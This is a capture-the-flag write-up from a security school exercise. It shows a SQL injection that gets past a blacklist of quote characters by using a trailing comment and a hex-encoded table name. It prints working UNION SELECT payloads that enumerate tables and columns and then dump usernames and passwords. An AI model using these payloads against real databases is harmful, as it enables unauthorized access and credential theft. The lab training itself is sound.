---
Name: "Blacklist"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Bypassing a SQL injection blacklist with alternate query syntax."
---

# Blacklist
The website bans ' and "

The trick was to add #\ at the end of the query

Finding table names
```
UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = database() #\
1
3

search_engine
1
3

users
```

0x7573657273 = raw bytes of 'users'

Finding column names
```
UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name = 0x7573657273 #\
1
3

username
1
3

password
1
3

USER
1
3

CURRENT_CONNECTIONS
1
3

TOTAL_CONNECTIONS

```

Getting the flag
```
union select 1, username, password from users #\

1
SSS{draco_dormiens_nunquam_titillandus}

Administrator
```

